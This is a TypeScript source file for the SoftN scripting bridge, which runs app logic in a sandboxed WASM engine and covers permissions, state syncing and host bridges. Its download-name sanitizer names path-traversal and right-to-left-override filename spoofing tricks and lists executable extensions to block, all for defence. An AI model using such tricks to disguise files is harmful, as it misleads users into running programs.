/**
 * SoftN Scripting Bridge
 *
 * Integrates the scripting VM with the SoftN runtime. The engine itself is
 * selected in `./vm-adapter` — by default zipp, a JavaScript engine written in
 * Rust and compiled to WASM. All .logic code executes inside the WASM VM, so
 * the sandbox holds: no `eval`, no `new Function`, and no host object the
 * engine preamble did not hand over.
 *
 * The engine is reached through `createLogicEngine()` rather than named here,
 * so a host can put a different one behind the same `LogicEngine` surface
 * without this file knowing. Nothing does today; the default is the same ZIPP
 * adapter this file used to construct directly.
 */

import {
  VM_BRIDGE_PREAMBLE,
  createLogicEngine,
  createPythonLogicEngine,
  logicEngineIsSandboxed,
  type LogicEngine,
  type PythonProject,
  type SymbolScope,
} from './vm-adapter';
import { SandboxHost } from './sandbox-host';
import { readZipText } from './zip-text';
import { sha256Hex } from '../bundle/crypto';
import { SOFTN_BRIDGE_PREAMBLE } from './softn-preamble';
import { LogicTimers, TIMER_PREAMBLE_NAMES, TIMER_TRAILER, timerPreamble } from './logic-timers';
import { placeSyntaxError } from './logic-syntax';
import { moduleSyntaxAsScript } from './module-syntax';
import { sanitizeArgs } from './vm-args';
import type { DocumentShell, ShellOp } from '../document-shell/host';
import {
  SHELL_EVENT,
  SHELL_READY,
  SHELL_SYNC,
  SHELL_TAKE,
  holdsShellNode,
  isShellName,
  namesDeclaredBy,
  usesDocument,
} from '../document-shell/names';
import type { LocalSpeechHost } from './local-speech';
import { extractEventProps } from './event-props';
import { appHears, clearCapturedKeys, parseCapturedKeys, setAppElement, setCapturedKeys, shouldCaptureKey } from './key-capture';
import { deepEqual } from './vm-state';
import {
  COMPUTED_PREFIX,
  COMPUTED_SETTLE_FUNCTION,
  computedSource,
  extractComputedDeclarations,
  guardFirstValues,
  namesReadBy,
  planComputed,
  type ComputedDeclaration,
} from './computed-declarations';
import { readsOfDrawnFunctions } from './drawn-functions';
import { storageVisitorToken } from './visitor-token';

import type { ScriptBlock, LogicBlock, SoftNDocument } from '../parser/ast';
import type { AppPermissions } from '../bundle/types';
import { getFileByRef, registerFileRef } from './file-registry';
import { pcmToWavDataUrl } from './wav';
import { isRemoteUrl } from '../renderer/sanitize-html';
import { buildSyncCacheKey } from './sync-cache-key';
import { createSyncControls } from './db-sync-controls';
import { describeNetDestination } from './egress-policy';
import { EventCoalescer, coalescePolicyFor } from './event-coalescer';
import type {
  BundleFileProvider,
  AIPermissionConfig,
  GpuPermissionConfig,
} from './ai-manager';
import { debug } from './debug';
export type { BundleFileProvider } from './ai-manager';
// Beside `collectObservedStateNames`, which a host calls with it.
export { collectDrawnNames } from './drawn-functions';

/**
 * Type alias for code blocks - either ScriptBlock or LogicBlock
 */
export type CodeBlock = ScriptBlock | LogicBlock;
import type { RuntimeState, XDBRecord } from '../types';

/**
 * Execution context handed to SoftN scripts.
 */
export interface ScriptContext {
  // State management
  state: RuntimeState;
  setState: (path: string, value: unknown) => void;
  /** Batch multiple state changes into a single React setState call (optional optimization) */
  batchSetState?: (changes: Record<string, unknown>) => void;
  /**
   * Draw the page again, though no state it holds has changed: state that
   * only a function the page calls while it is drawn reads has moved in the
   * engine. Optional; a host without it has such state copied to the page
   * instead, which is slower and has the same effect.
   */
  redraw?: () => void;

  // XDB data
  data: Record<string, XDBRecord[]>;

  // XDB operations
  xdb: XDBModule;

  // Navigation
  nav: NavModule;

  // Console (for debugging)
  console: ConsoleModule;
}

/**
 * XDB module for SoftN scripts
 */
export interface XDBModule {
  create: (collection: string, data: Record<string, unknown>) => Promise<XDBRecord>;
  update: (id: string, data: Record<string, unknown>) => Promise<XDBRecord>;
  delete: (id: string) => Promise<void>;
  query: (collection: string, filter?: Record<string, unknown>) => Promise<XDBRecord[]>;
  get: (collection: string, id: string) => Promise<XDBRecord | null>;
  sync: () => Promise<void>;
}

/**
 * Navigation module for SoftN scripts
 */
export interface NavModule {
  goto: (page: string) => void;
  back: () => void;
  params: Record<string, string>;
}

/**
 * Console module for SoftN scripts
 */
export interface ConsoleModule {
  log: (...args: unknown[]) => void;
  error: (...args: unknown[]) => void;
  warn: (...args: unknown[]) => void;
}

export type ScriptRuntimeMode = 'main' | 'worker';

/** State the framework reads by name, whatever the document happens to say. */
const FRAMEWORK_OBSERVED_STATE: readonly string[] = ['currentPage'];

/**
 * Every identifier the document could resolve against React state.
 *
 * Pass the result as {@link ScriptRuntimeOptions.observedStateNames} and the
 * runtime stops mirroring state variables the document never names — see
 * `partitionStateVars` for why that is worth doing and why it is safe.
 *
 * The logic block is excluded because it DECLARES these names: scanning it
 * would match every one of them and hold nothing back. Everything else is
 * scanned, markup and styles and data alike, and scanned as text rather than
 * walked as a tree — a name in a comment or a CSS class needlessly keeps its
 * variable synced, which costs a little speed, where missing a real reference
 * would silently freeze part of the UI. Only one of those is worth risking.
 *
 * Returns null when the document cannot be scanned, meaning "sync everything".
 */
export function collectObservedStateNames(doc: SoftNDocument): ReadonlySet<string> | null {
  const { script: _script, logic: _logic, ...observable } = doc;
  let text: string;
  try {
    text = JSON.stringify(observable) ?? "";
  } catch {
    // Cyclic or otherwise unserialisable: nothing can be proven unobserved.
    return null;
  }
  if (!text) return null;
  const names = new Set<string>(FRAMEWORK_OBSERVED_STATE);
  // Unicode-aware, because the engine is: `let café = 1` compiles, and an
  // ASCII-only scan tokenised it as "caf" — so the real name never entered the
  // observed set, the variable was classed VM-owned, and it silently stopped
  // syncing to React. That is the asymmetry this scan is built around, falling
  // the wrong way: over-collecting costs a little speed, under-collecting
  // freezes part of the UI with nothing to suggest why.
  for (const match of text.matchAll(/[\p{ID_Start}$_][\p{ID_Continue}$_]*/gu)) names.add(match[0]);
  return names;
}

/**
 * How a runtime gets the document a page's code is given: made, and its
 * code loaded, only when the code turns out to use one. Most pages never do.
 */
export interface DocumentShellRequest {
  create(): Promise<DocumentShell>;
}

export interface ScriptRuntimeOptions {
  mode?: ScriptRuntimeMode;
  /**
   * The document the page's code is given when it uses one (`document.…`):
   * its plain HTML as a tree the code can find, change and listen to, as in
   * a browser (document-shell/). Taken only by JavaScript on the main
   * thread; Python, and a script in a worker, are not given it.
   */
  documentShell?: DocumentShellRequest;
  /**
   * The page's markup has handlers written for a browser that SoftN does not
   * read (see `hasPageHandlers`): the page is given its document for them,
   * whatever its code says.
   */
  browserHandlers?: boolean;
  /**
   * Where the app's own files are, as its markup's `src="images/x.png"`
   * finds them: what a page's `fetch('data.json')` reads (`bundle.read`).
   */
  assetResolver?: (path: string) => string;
  /**
   * Logic files the host already concatenated into `script.code` itself.
   *
   * A host that assembles a bundle may inline manifest-listed `.logic` files
   * ahead of the entry file. Those files are then already part of this
   * compilation, so an `import` naming one must not inline it a second time —
   * every class and variable in it would be declared twice, which the VM
   * rejects. Paths are bundle-relative, matching what `importResolver` takes.
   */
  preIncludedLogicPaths?: readonly string[];
  /**
   * The bundle's parsed `permission.json`.
   *
   * Without it every capability check runs in "no config" mode, which is
   * permissive for most APIs but still refuses plain `http://` — so a bundle
   * that legitimately declares `net.allow_http` cannot reach its own server.
   */
  permissionConfig?: PermissionConfig;
  /**
   * Every identifier the document could resolve against React state.
   *
   * State variables outside this set are owned by the VM: the host neither
   * reads them back nor writes them, because nothing outside the VM can
   * observe them. See {@link SoftNScriptRuntime.partitionStateVars}.
   *
   * Omit it and every state variable is synced, which is what every host did
   * before this existed and is always correct — just slower.
   */
  observedStateNames?: ReadonlySet<string>;
  /**
   * Every name the document could call while it is drawn, from
   * `collectDrawnNames`: the names its expressions are written with, without
   * what only an event runs.
   *
   * A function among them is how a page reads state its markup does not
   * name, so what that function may read is observed as well. Only looked at
   * beside {@link observedStateNames}. Omit it and every observed name is
   * supposed to be drawn, which is correct and holds less back: a game's
   * `@tick={tick}` then counts, and `tick` reads everything.
   */
  drawnNames?: ReadonlySet<string>;
  /**
   * Where `softn.storage.*` sends its operations: the storage endpoint of
   * the app in the directory that published it. Absent for an app opened
   * from a file, which then has no server storage and is told so.
   */
  storageEndpoint?: string;
  /** Host-owned action bridge. No URLs or credentials are exposed to app scripts. */
  backendCall?: (action: string, input: Record<string, unknown>) => Promise<unknown>;
  /**
   * Where `softn.net.fetch` goes instead of the browser's `fetch`.
   *
   * Some hosts do not give an app the network at all: they route what it asks
   * for through something of their own — a backend that owns the credentials,
   * a proxy that owns the allowlist — and the app never holds a URL the
   * browser would act on. Those hosts used to do this by rewriting
   * `softn.net.fetch` inside the guest, which works only while the guest is
   * JavaScript and only while the host is willing to edit the author's source.
   * This is the same substitution made on the host's side of the VM, so it
   * does not depend on either.
   *
   * Setting it MOVES the capability, checks included. `permission.json`'s
   * `net` block and `allowed_hosts` describe what the app may reach with the
   * browser's `fetch`, and there is no browser `fetch` here; the handler's
   * owner decides what the call is allowed to become. That is the same
   * arrangement as `backendCall`, which has never been permission-checked
   * either, because the host names the actions it will answer.
   *
   * Absent — every host that has one today — `softn.net.fetch` is exactly what
   * it was: the permission check, the host allowlist, and the browser's fetch.
   */
  netFetchHandler?: NetFetchHandler;
  /**
   * The app's logic, when it is written in Python rather than JavaScript.
   *
   * `composeBundleSource` sets it from the bundle's own file names: a logic
   * file ending `.py` is Python. When it is present the script's `<logic>`
   * block is empty by construction and these modules are what the engine
   * compiles — there is no JavaScript to assemble, and an engine that cannot
   * run Python is refused before any of the author's code is touched.
   */
  pythonProject?: PythonProject;
  /**
   * The visitor identity sent with storage requests, for collections whose
   * policy records who added a record. Absent, the runtime uses the token
   * this browser keeps (see visitor-token.ts); null sends none.
   */
  storageVisitorToken?: string | null;
  /**
   * Called when a `localStorage` write the script made was refused by the
   * browser — quota, most often. The script sees the failure too, as an
   * exception from the call; this is for the host to tell the person, who
   * otherwise learns of a lost save when they come back for it.
   */
  onPersistenceFailure?: (failure: PersistenceFailure) => void;
  /**
   * Show what the page's `alert()` says, inside the app. With none, it is
   * written to the console: the browser's own dialog is never used, since
   * it carries the host's name and holds the whole tab.
   */
  onAlert?: (message: string) => void;
}

/**
 * What `softn.net.fetch` answers a script with: the browser response reduced
 * to what crosses into the VM. A handler returns this so a script cannot tell
 * which side of the VM the request was made from.
 */
export interface NetFetchResult {
  ok: boolean;
  status: number;
  statusText?: string;
  body: string;
  headers: Record<string, string>;
}

/**
 * A host's stand-in for the browser's `fetch`, for `softn.net.fetch`.
 *
 * `options` is the object the script passed, already parsed — `method`,
 * `headers`, `body`, `timeout` — and `url` is the URL it wrote, unjudged. See
 * {@link ScriptRuntimeOptions.netFetchHandler} for what supplying one means.
 */
export type NetFetchHandler = (
  url: string,
  options: Record<string, unknown>
) => Promise<NetFetchResult>;

/** A write to the browser's storage that was not kept, as reported to the host. */
export interface PersistenceFailure {
  /** `setItem`, `removeItem` or `clear`. */
  operation: string;
  /** The script's own key, without the app prefix; empty for `clear`. */
  key: string;
  /** The browser's exception, with its own name for the cause. */
  error: Error;
}

export interface ScriptLoadResult {
  state: Record<string, unknown>;
  functions: Record<string, (...args: unknown[]) => Promise<unknown>>;
  syncFunctions: Record<string, (...args: unknown[]) => unknown>;
  computed: Record<string, () => unknown>;
}

export interface ScriptRuntimeHandle {
  loadScript: (script: CodeBlock) => Promise<ScriptLoadResult>;
  updateContext: (newState: Partial<RuntimeState>) => void;
  cleanup: () => void;
  /** The element the app is drawn in: its window listeners hear what is aimed there. */
  setAppRoot?: (element: Element | null) => void;
}

/**
 * Permission config from permission.json — describes what capabilities an app needs.
 */
export interface PermissionConfig {
  app?: { id?: string; name?: string; version?: string };
  permissions: {
    net?: { enabled?: boolean; allowed_hosts?: string[]; allow_http?: boolean };
    camera?: { enabled?: boolean; modes?: string[] };
    mic?: { enabled?: boolean; maxSeconds?: number };
    files?: { enabled?: boolean; scopes?: string[] };
    qr?: { enabled?: boolean };
    ai?: AIPermissionConfig;
    gpu?: GpuPermissionConfig;
    sync?: { enabled?: boolean };
    /**
     * The app's own database on the directory that publishes it, reached
     * through `softn.storage.*`. Unrelated to the manifest's legacy
     * `permissions.storage` flag, which is about localStorage.
     */
    storage?: {
      enabled?: boolean;
      /**
       * A policy per collection name (`*` for the rest): who may read, add,
       * change and remove its records. See STORAGE_POLICIES in capabilities.ts.
       * Fixed at publication; the directory enforces it, not the runtime.
       */
      collections?: Record<string, string>;
    };
    /**
     * Generated numeric code runs on the host's own engine: the script hands
     * over functions it builds at run time (an emulator's compiled traces, a
     * signal kernel), validated against a closed arithmetic language and bound
     * to views of the script's typed arrays. Many times faster than the
     * sandbox's interpreter for that code; nothing else of the host is
     * reachable from it.
     */
    accel?: { enabled?: boolean };
  };
  /**
   * The bundle declared capabilities and the user has not answered yet.
   *
   * Set by the host when it boots an app with its declared capabilities
   * withheld so the UI can be seen before anything is granted. `permissions`
   * is empty in that state, so every check already denies; this only changes
   * what the denial says. Without it the app is told to "add net.enabled to
   * permission.json" — advice for an author, about a file that already says
   * exactly that, aimed at a user who has simply not clicked Allow.
   */
  consentPending?: boolean;
}

/** Pending host call from the VM (mirrors Rust PendingHostCall) */
export interface PendingHostCall {
  id: number;
  kind: string;
  args: string[];
}

/** How a sound reached silence — what `audio.whenEnded` resolves with. */
interface AudioOutcome {
  handle: string;
  status: 'ended' | 'stopped' | 'error';
  durationMs?: number;
  reason?: string;
}


/**
 * Fast compatibility check used for worker-mode migration gating.
 * Scripts that rely on synchronous host bridges are currently main-thread only.
 *
 * Strips comments and string literals before matching, so a bridge name
 * inside a string or a comment is not mistaken for a use. (The retired
 * FormLogic VM once offered a lexer-based detector here; the ZIPP engine has
 * no such hook and this is the only implementation.)
 */
export function detectWorkerIncompatibilities(code: string): string[] {
  if (!code) return [];

  // Strip comments and string literals to prevent false positives.
  const stripped = code
    .replace(/\/\*[\s\S]*?\*\//g, '')
    .replace(/\/\/[^\n\r]*/g, '')
    .replace(/`(?:[^`\\]|\\.)*`/g, '""')
    .replace(/"(?:[^"\\]|\\.)*"/g, '""')
    .replace(/'(?:[^'\\]|\\.)*'/g, '""');

  const reasons: string[] = [];
  const checks: Array<{ pattern: RegExp; reason: string }> = [
    { pattern: /\bdb\./, reason: 'uses db bridge (synchronous host access)' },
    { pattern: /\bwindow\./, reason: 'uses window bridge/event APIs' },
    { pattern: /\bnavigator\./, reason: 'uses navigator bridge APIs' },
    { pattern: /\blocalStorage\./, reason: 'uses localStorage bridge' },
    { pattern: /\bhost\./, reason: 'uses host.call bridge (async host access)' },
  ];

  for (const check of checks) {
    if (check.pattern.test(stripped)) {
      reasons.push(check.reason);
    }
  }

  return reasons;
}

/**
 * Names of variables added by BRIDGE_PREAMBLE that should not be treated
 * as user state variables.
 */
const EXTERNAL_VALUES_VAR = '__softnExternalValues';
const BRIDGE_VARS = new Set([
  'window',
  'navigator',
  'host',
  'softn',
  EXTERNAL_VALUES_VAR,
  ...TIMER_PREAMBLE_NAMES,
]);
const EXTERNAL_FUNCTION_RESERVED_NAMES = new Set([...BRIDGE_VARS, 'db', 'localStorage']);

/**
 * Cross-check every "unchanged" digest against a full value comparison.
 *
 * Set `globalThis.__SOFTN_FP_AUDIT__ = true` before a bundle loads. Costs
 * exactly what the digests save, so it is for verifying them, not for use.
 */
function FINGERPRINT_AUDIT(): boolean {
  return (globalThis as unknown as Record<string, unknown>).__SOFTN_FP_AUDIT__ === true;
}

/**
 * How many times the `$:` values of a script are worked out, at most, to
 * find them still. Only a script where one reads another through a function
 * is passed over more than once: each pass carries a change one such step
 * further, so this is the longest chain of them that settles — and what a
 * pair that never will is allowed to cost.
 */
const COMPUTED_SETTLE_PASSES = 8;

/** Kinds of file a double-click runs rather than opens. */
const RUNS_WHEN_OPENED =
  /\.(?:exe|com|bat|cmd|msi|msix|msp|scr|pif|lnk|url|hta|js|jse|vbs|vbe|wsf|wsh|ps1|psm1|reg|cpl|jar|app|dmg|pkg|command|desktop|appimage|deb|rpm|apk|sh|scf|inf|gadget|application|appref-ms)$/i;

/**
 * The name a file an app saves is offered under. A leaf, never a path, so an
 * app cannot suggest "../.bashrc"; no control characters, and none of the
 * invisible ones that turn text around (`report\u202efdp.exe` reads as
 * `reportexe.pdf`); not a name Windows keeps for a device; and a kind of file
 * that runs when it is opened is saved as text, so a click in an app is never
 * a program on the person's desktop.
 */
export function downloadName(raw: unknown): string {
  let name = String(raw || 'download')
    // The control characters are the point of the pattern, not a slip.
    // eslint-disable-next-line no-control-regex
    .replace(/[\\/:*?"<>|\u0000-\u001f\u007f-\u009f]/g, '_')
    .replace(/[\u200b-\u200f\u202a-\u202e\u2066-\u2069\ufeff]/g, '')
    .replace(/^[.\s]+/, '')
    .replace(/[.\s]+$/, '')
    .slice(0, 200);
  if (!name) name = 'download';
  if (/^(?:con|prn|aux|nul|com\d|lpt\d)(?:\.|$)/i.test(name)) name = `_${name}`;
  if (RUNS_WHEN_OPENED.test(name)) name = `${name}.txt`;
  return name;
}

/** `window.__…` names a script's window never writes to the page's (see syncWindowFromVM). */
const HOST_WINDOW_NAME = /^__(?:tauri|react|softn|vite|webpack|playwright|vue|next|nuxt|zone|proto__$)/i;

/** A name safe to paste into generated source as an identifier. */
const VALID_IDENTIFIER = /^[a-zA-Z_$][a-zA-Z0-9_$]*$/;

type ExternalPrimitive = string | number | boolean | null | undefined;
const UNSUPPORTED_EXTERNAL_VALUE = Symbol('unsupported external value');
type ExternalValueRead = ExternalPrimitive | typeof UNSUPPORTED_EXTERNAL_VALUE;

/** Match the value JSON source generation used for external bridge snapshots. */
function normalizeExternalPrimitive(value: unknown): ExternalValueRead {
  if (value === null || value === undefined) return value;
  if (typeof value === 'string' || typeof value === 'boolean') return value;
  if (typeof value === 'number') {
    // JSON.stringify was historically used for the injected return literal:
    // non-finite numbers became null and negative zero became zero.
    if (!Number.isFinite(value)) return null;
    return Object.is(value, -0) ? 0 : value;
  }
  return UNSUPPORTED_EXTERNAL_VALUE;
}

/**
 * SoftN Script Runtime
 * Executes .logic code inside the WASM VM for true sandboxing.
 * No `new Function()` calls are used — all user code runs in the VM.
 */
export class SoftNScriptRuntime {
  private vmEngine: LogicEngine | null = null;
  private readonly onPersistenceFailure: ((failure: PersistenceFailure) => void) | null;
  private readonly onAlert: ((message: string) => void) | null;
  /** How many of the page's alerts have been shown (see `dialog.alert`). */
  private alertsShown = 0;
  private context: ScriptContext;
  private db: DBNamespace;
  private permissions?: AppPermissions;
  private appId?: string;
  private runtimeMode: ScriptRuntimeMode;
  /** Cached XDB service for notification batching */
  private xdbService: import('./xdb').XDBService | null = null;

  /** Symbol map from VM globals (set after initializeScript) */
  private symbolMap: Map<string, { index: number; scope: SymbolScope }> | null = null;
  /** Names of state variables (non-function, non-bridge globals) */
  private stateVarNames: string[] = [];
  /** Cached slot indices for state variables (parallel to stateVarNames) */
  private stateVarIndices: number[] = [];
  /** Digests from the last read, parallel to stateVarIndices. */
  private stateVarFingerprints: number[] | null = null;
  /** Identifiers the document can resolve; null means "assume all of them". */
  private observedStateNames: ReadonlySet<string> | null = null;
  /** Names the document could call while it is drawn; null means "any observed name". */
  private drawnNames: ReadonlySet<string> | null = null;
  private backendCall?: ScriptRuntimeOptions['backendCall'];
  /** The host's stand-in for the browser's fetch, if it supplied one. */
  private netFetchHandler?: NetFetchHandler;
  /** The Python modules to compile, when the app's logic is Python. */
  private pythonProject?: PythonProject;
  private storageEndpoint: string | null = null;
  private visitorToken: string | null | undefined = undefined;
  /** State variables held back from syncing, for diagnostics only. */
  private vmOwnedStateNames: string[] = [];
  /** The same names as a set, for the per-key push to consult on every call. */
  private vmOwnedStateSet = new Set<string>();
  /** Guard: when true, sync functions must not overwrite VM state (async call in-flight) */
  private asyncCallInProgress = false;
  /** Mutex for async VM calls to prevent concurrent stack corruption.
   *  Uses a release-function pattern instead of .then() chaining to avoid
   *  unbounded promise chain growth that causes GC pressure over time. */
  private vmCallLock: Promise<void> = Promise.resolve();
  /** Current depth of queued async VM calls. If this exceeds the limit,
   *  new calls are dropped with a warning to prevent memory pressure and input lag. */
  private vmCallQueueDepth = 0;
  /**
   * Granular dirty tracking: tracks which specific state keys have changed since
   * the last syncReactStateToVM(). Only the dirty keys are synced to the VM,
   * avoiding redundant WASM boundary crossings for unchanged state.
   * Initialized to null to signal "sync all" on first call.
   */
  private dirtyStateKeys: Set<string> | null = null;

  /**
   * Per-render cache for sync function results.
   * Cleared when state changes (via syncReactStateToVM dirty detection)
   * and automatically expires between render frames (>2ms gap detection).
   */
  private syncCallCache = new Map<string, unknown>();
  /** Timestamp of last sync function call — for frame boundary detection. */
  private lastSyncCallTs = 0;

  /**
   * The loaded script's top-level `$:` declarations in the order they are
   * worked out, or null when it has none — every app that shipped before
   * this existed, for which none of what follows runs.
   *
   * `untilStill` is for a script where one `$:` reads another through a
   * function: its values are worked out again until a pass changes nothing.
   */
  private computedSettle: { names: string[]; untilStill: boolean } | null = null;
  /** Whether the `$:` globals may be behind the state they are worked out from. */
  private computedStale = true;
  /** The values handed to the page for the draw in progress. */
  private computedBatch: Map<string, unknown> | null = null;
  /** The failure last said for each `$:` value, so it is said when it changes and not at every draw. */
  private computedFailures = new Map<string, string>();
  /** Whether the values have been said not to settle. */
  private computedUnsettledSaid = false;

  /**
   * Active native event listeners for the window bridge.
   * Managed at the JS level since the WASM VM stores handler Values internally.
   */
  private nativeListeners: Map<string, EventListener[]> = new Map();
  /** Per-frame delivery for the high-frequency events; disposed with the listeners. */
  private eventCoalescers: EventCoalescer[] = [];

  /** Index of the `window` global in the VM */
  private windowGlobalIndex: number = -1;

  /** Set of __ window property keys to sync */
  private syncKeys: Set<string> = new Set();
  /** Cached: true when at least one syncKey is defined on the real window */
  private windowSyncActive = false;
  /**
   * The `__` globals the host page already had when this runtime was made —
   * `__TAURI__`, `__softnAsset`, a devtools hook. A script may read them, and
   * a script that sets `window.__TAURI__` in the VM is welcome to its own
   * copy, but none of them is written back to the real window: that is the
   * host's bridge to native, and a bundle replacing it is a bundle taking the
   * host over. Everything the app introduces itself still syncs both ways,
   * which is what the games' input latches (`__scene3dLocked`, `__dhFire`)
   * rely on — Scene3D and the demo driver set those on the real window after
   * the script has declared them.
   */
  private readonly hostWindowKeys: Set<string>;
  /**
   * Keys this runtime wrote onto the real window. Removed again at cleanup,
   * so that a reload of the same app does not find its own latches already
   * there and mistake them for the host's.
   */
  private windowKeysWritten = new Set<string>();

  /** Event types already bridged from VM → browser (prevents duplicate listeners) */
  private bridgedEventTypes: Set<string> = new Set();

  /** Import resolver for .logic file imports (resolves path → source code) */
  private importResolver?: (path: string) => Promise<string | null>;
  /** Base path of the .logic file for resolving relative imports */
  private logicBasePath?: string;
  /**
   * Every `.logic` path already part of this compilation — whether the host
   * concatenated it or an earlier import pulled it in. The single registry
   * that makes inclusion idempotent no matter which path reached the file.
   */
  private includedLogicPaths = new Set<string>();

  /** Permission config from permission.json (set via setPermissionConfig) */
  private permissionConfig: PermissionConfig | null = null;

  /** Local models on ZIPP, created on the first softn.ai.model.* call (models/model-host.ts). */
  private modelHost: import('./models/model-host').ModelHost | null = null;
  /** Lazy-loaded GPU compute manager (created on first softn.ai.gpu.* call) */
  private gpuComputeManager: import('./ai-gpu-compute-manager').GpuComputeManager | null = null;
  /** Bundle file provider for loading models from .softn bundles */
  private bundleFileProvider: BundleFileProvider | null = null;
  /** External functions (e.g. wallet bridge) to inject into the VM as callable globals */
  private sandboxHost: SandboxHost | null = null;
  private externalFunctions: Record<string, (...args: unknown[]) => unknown> | null = null;
  /** No-argument external bridge names compiled into the current VM. */
  private externalFunctionNames: string[] = [];
  /** Last primitive snapshot written to the VM, parallel to externalFunctionNames. */
  private externalFunctionValues: ExternalPrimitive[] = [];
  /** Slot holding the mutable external bridge value table inside the VM. */
  private externalValuesGlobalIndex = -1;
  /** Network requests owned by this runtime, cancelled when the app closes. */
  private netAbortControllers = new Set<AbortController>();
  private localSpeech: LocalSpeechHost | null = null;
  private static readonly MAX_NET_RESPONSE_BYTES = 10 * 1024 * 1024;
  /** A page that has said this much with `alert()` has stopped telling the person anything. */
  private static readonly MAX_ALERTS = 50;

  /** Sounds this app currently has playing, by the handle its script holds.
   *  `watchers` are pending `whenEnded` calls; each hears exactly one outcome. */
  private audioPlaying = new Map<
    string,
    {
      el: HTMLAudioElement;
      volume: number;
      watchers: Array<(outcome: AudioOutcome) => void>;
    }
  >();
  /** Outcomes of sounds that are gone, so a `whenEnded` asked after the fact
   *  still answers with what happened. Every one-shot lands here, so it is
   *  capped — the oldest is forgotten and reads as unknown. */
  private audioFinished = new Map<string, AudioOutcome>();
  private static readonly MAX_AUDIO_FINISHED = 256;
  private audioMasterVolume = 1;
  private audioSeq = 0;
  /** Gesture listeners waiting to start a soundtrack the browser refused. */
  private audioUnlockers = new Set<() => void>();

  /** QR image loads/detections in flight. Cleanup rejects them immediately. */
  private qrDecodeCancelers = new Set<() => void>();
  private static readonly QR_OPERATION_TIMEOUT_MS = 10_000;

  /**
   * The recording in flight, if any.
   *
   * One at a time: two overlapping `softn.mic.record()` calls would fight over
   * the same device, and the second would take the first's samples with it.
   * `finish` is how both the duration timer and an early `mic.stop()` end the
   * same recording without either needing to know about the other.
   */
  private micRecording: { stop: (reason: 'complete' | 'stopped') => void } | null = null;
  /**
   * Device access can remain pending while the browser shows its permission
   * prompt. Reserve that interval too, so cleanup and a second record request
   * cannot lose track of a stream that has not been handed back yet.
   */
  private micAcquisition: { cancelled: boolean } | null = null;

  constructor(
    context: ScriptContext,
    permissions?: AppPermissions,
    appId?: string,
    importResolver?: unknown,
    logicBasePath?: string,
    options?: ScriptRuntimeOptions,
    bundleFileProvider?: BundleFileProvider,
    externalFunctions?: Record<string, (...args: unknown[]) => unknown>
  ) {
    this.context = context;
    this.permissions = permissions;
    this.appId = appId;
    // Taken before the app's document mounts, so what is here is the host's.
    this.hostWindowKeys = new Set(
      typeof window === 'undefined'
        ? []
        : Object.getOwnPropertyNames(window).filter((k) => k.startsWith('__'))
    );
    this.runtimeMode = options?.mode || 'main';
    this.documentShellRequest = options?.documentShell ?? null;
    this.browserHandlers = options?.browserHandlers === true;
    this.assetResolver = options?.assetResolver ?? null;
    this.observedStateNames = options?.observedStateNames ?? null;
    this.drawnNames = options?.drawnNames ?? null;
    this.storageEndpoint = options?.storageEndpoint ?? null;
    this.backendCall = options?.backendCall;
    this.netFetchHandler = options?.netFetchHandler;
    this.pythonProject = options?.pythonProject;
    this.visitorToken = options?.storageVisitorToken;
    this.onPersistenceFailure = options?.onPersistenceFailure ?? null;
    this.onAlert = options?.onAlert ?? null;
    this.externalFunctions = externalFunctions ?? null;
    this.db = createDBNamespace(() => this.permissionConfig, appId);
    if (typeof importResolver === 'function') {
      this.importResolver = importResolver as (path: string) => Promise<string | null>;
    }
    this.logicBasePath = logicBasePath;
    this.bundleFileProvider = bundleFileProvider ?? null;
    if (options?.permissionConfig) {
      this.permissionConfig = options.permissionConfig;
    }
    for (const p of options?.preIncludedLogicPaths ?? []) {
      this.includedLogicPaths.add(p);
    }
  }

  /** Set the permission config for this runtime (from permission.json). */
  setPermissionConfig(config: PermissionConfig): void {
    this.permissionConfig = config;
  }

  /** Read the current value of a no-argument host bridge without leaking errors. */
  private readExternalFunctionValue(name: string): ExternalValueRead {
    try {
      const fn = this.externalFunctions?.[name];
      if (typeof fn !== 'function') return UNSUPPORTED_EXTERNAL_VALUE;

      const result = fn();
      if (result != null && typeof (result as { then?: unknown }).then === 'function') {
        // These VM globals are synchronous snapshots. Keep async bridges out of
        // them, and make sure a rejected promise cannot become unhandled.
        Promise.resolve(result).catch(() => {});
        return UNSUPPORTED_EXTERNAL_VALUE;
      }
      return normalizeExternalPrimitive(result);
    } catch {
      return UNSUPPORTED_EXTERNAL_VALUE;
    }
  }

  /**
   * Refresh compiled host bridge values in place.
   *
   * The declarations stay in the same VM, so changing a React `functions`
   * implementation cannot re-run script top-level code or `_init()`.
   */
  private syncExternalFunctionsToVM(): void {
    if (!this.vmEngine || this.externalValuesGlobalIndex < 0) return;

    const nextValues = this.externalFunctionNames.map((name) => {
      const value = this.readExternalFunctionValue(name);
      return value === UNSUPPORTED_EXTERNAL_VALUE ? undefined : value;
    });
    const changed = nextValues.some(
      (value, index) => !Object.is(value, this.externalFunctionValues[index])
    );
    // Always restore the table before VM execution. It is an implementation
    // global in the same compilation unit, so app code must not be able to
    // leave a forged bridge value behind by assigning to it.
    this.vmEngine.setGlobal(this.externalValuesGlobalIndex, nextValues);
    if (!changed) return;

    this.externalFunctionValues = nextValues;
    // A template helper may already be cached for this render. Its answer was
    // computed with the previous host snapshot and must not survive the write.
    this.syncCallCache.clear();
    this.computedMayHaveMoved();
  }

  /**
   * Empty result for a load that was abandoned before it could run.
   */
  private static readonly ABANDONED: ScriptLoadResult = {
    state: {},
    functions: {},
    syncFunctions: {},
    computed: {},
  };

  /**
   * True once `cleanup()` has run.
   *
   * `loadScript` is a long async chain and `cleanup()` only disposes an engine
   * that already exists. A cleanup arriving while the first `await` is still
   * pending therefore disposed nothing, and the continuation went on to build a
   * fresh engine and execute the script in it — leaking one WASM engine per
   * mount and running the `.logic` top level a second time. Under
   * `React.StrictMode`, which all four apps use, that is every single mount:
   * measured with a bundle whose top level calls `db.create`, two records
   * appeared where the author wrote one.
   */
  private disposed = false;
  /** Logged once: the engine is dead and calls are being dropped. */
  private terminationLogged = false;

  /** Stop and clean up if this runtime was disposed during an await. */
  private abandonIfDisposed(): boolean {
    if (!this.disposed) return false;
    if (this.vmEngine) {
      this.vmEngine.dispose();
      this.vmEngine = null;
    }
    return true;
  }

  /**
   * Wire the host objects the engine calls synchronously from inside the VM.
   *
   * Its own method because the `$:` compile fallback below has to build a
   * second engine and repeat all of it: zipp v0.0.1 terminates an Engine whose
   * `initScript` throws, and that clears its bridges as well as its authority.
   *
   * Each `register*` call also declares the operations it serves, inside the
   * adapter — so a host cannot install a bridge and leave the guest denied.
   */
  private installHostBridges(): void {
